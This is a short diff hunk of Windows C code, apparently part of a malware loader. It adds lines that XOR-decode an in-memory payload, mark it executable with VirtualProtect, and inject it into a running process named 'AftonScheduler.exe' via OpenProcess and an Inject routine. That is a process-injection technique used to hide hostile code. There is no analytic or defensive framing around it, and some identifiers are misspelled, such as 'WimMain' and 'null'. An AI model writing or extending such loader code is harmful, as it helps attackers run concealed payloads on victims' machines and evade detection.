@@ -134,7 +134,21 @@ int WINAPI WimMain(HINStANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     RtlMoveMemory(exec_mem, payload, payload_len);
     int pid = 0;
     HANDLE hProc = NULL;
-    XOR((char * ))
+    XOR((char * )exec_mem,payload_len, KEY, sizeof(KEY));
 
+    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+    pid = FindTarget("AftonScheduler.exe");
+    if(pid){
+        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
+
+        if(hProc != null)
+        {
+            Inject(hProc, exec_mem, payload_len);
+            CloseHandle(hProc);
+
+        }
+    }
+    return 0;
 
 }
